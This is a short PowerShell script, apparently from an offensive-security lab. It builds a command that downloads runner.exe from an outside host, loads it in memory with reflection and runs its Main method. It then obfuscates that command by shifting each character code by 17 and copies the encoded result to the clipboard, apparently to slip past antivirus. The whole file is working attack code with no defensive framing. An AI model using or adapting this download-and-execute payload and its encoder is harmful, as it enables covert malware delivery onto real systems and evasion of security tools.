$payload = "powershell -Command `"$bytes = (Invoke-WebRequest 'http://192.168.45.189/runner.exe').Content; " +
           "$assembly = [System.Reflection.Assembly]::Load($bytes); " +
           "$entryPointMethod = $assembly.GetTypes().Where({$_.Name -eq 'Program'}, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic'); " +
           "$entryPointMethod.Invoke($null, (, [string[]] ('arg1', 'arg2')))`""


[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip

